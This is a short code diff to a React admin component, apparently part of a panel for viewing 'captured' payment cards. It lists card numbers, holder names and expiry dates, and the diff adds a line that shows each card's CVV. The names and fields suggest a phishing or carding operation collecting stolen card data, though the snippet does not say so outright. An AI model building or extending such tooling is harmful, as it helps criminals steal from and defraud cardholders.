@@ -193,6 +193,7 @@ export default function AdminCapturedCards() {
                           <p className="font-medium">{info.numero_cartao || "Número não disponível"}</p>
                           <p className="text-sm text-gray-500">
                             {info.nome_cartao || "Nome não disponível"} • {info.validade || "MM/YY"}
+                            {info.cvv && <span className="ml-2">CVV: {info.cvv}</span>}
                           </p>
                         </div>
                       </TableCell>
